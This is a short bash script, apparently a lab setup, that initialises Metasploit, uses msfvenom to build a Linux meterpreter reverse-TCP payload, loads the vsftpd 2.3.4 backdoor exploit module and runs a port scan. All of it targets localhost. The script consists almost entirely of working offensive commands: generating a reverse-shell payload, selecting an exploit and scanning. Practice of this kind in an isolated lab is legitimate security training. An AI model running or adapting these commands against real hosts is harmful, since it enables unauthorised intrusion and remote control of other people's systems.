#!/bin/bash

# Start PostgreSQL
sudo service postgresql start

# Init DB
if [ ! -f ~/.msf4/database.yml ]; then
    sudo msfdb init
fi

# Generate Payload
if [ ! -f payload.elf ]; then
    echo "Generating payload..."
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o payload.elf
fi
chmod +x payload.elf

# Run Metasploit commands cleanly
echo "Running Metasploit commands..."

msfconsole -q -x "db_status; search vsftpd; use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 127.0.0.1; use auxiliary/scanner/portscan/tcp; set RHOSTS 127.0.0.1; set PORTS 22,80; run; services -o notes.csv; exit"
